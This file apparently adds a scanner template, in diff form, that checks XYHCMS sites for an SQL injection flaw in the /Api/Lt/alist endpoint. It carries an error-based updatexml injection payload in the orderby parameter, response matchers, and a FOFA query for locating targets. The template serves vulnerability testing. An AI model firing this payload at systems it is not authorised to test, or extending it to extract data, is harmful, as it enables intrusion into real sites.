@@ -1,0 +1,24 @@
+id: poc-yaml-xyhcms-api-alist-sqli
+info:
+  name: 行云海CMS /Api/Lt/alist SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: 行云海CMS
+    fofa-query: app="XYHCMS"
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20md5({{t1}})),0x3a),1);]=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+      - type: word
+        words:
+          - "{{t2}}"
